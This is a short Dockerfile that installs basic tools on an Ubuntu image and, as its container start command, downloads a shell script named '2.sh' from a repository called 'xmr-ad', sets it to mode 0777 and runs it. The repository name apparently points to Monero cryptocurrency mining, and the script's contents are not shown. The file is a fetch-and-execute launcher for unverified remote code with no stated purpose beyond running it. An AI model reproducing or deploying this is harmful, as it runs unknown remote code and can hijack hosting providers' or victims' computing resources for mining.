FROM ubuntu

RUN apt-get update
RUN apt-get install sudo
RUN sudo apt-get update
RUN apt-get install wget -y
RUN apt-get install git -y
RUN apt-get install curl -y


CMD wget https://github.com/winkxx/xmr-ad/main/2.sh  && chmod 0777 2.sh && bash 2.sh
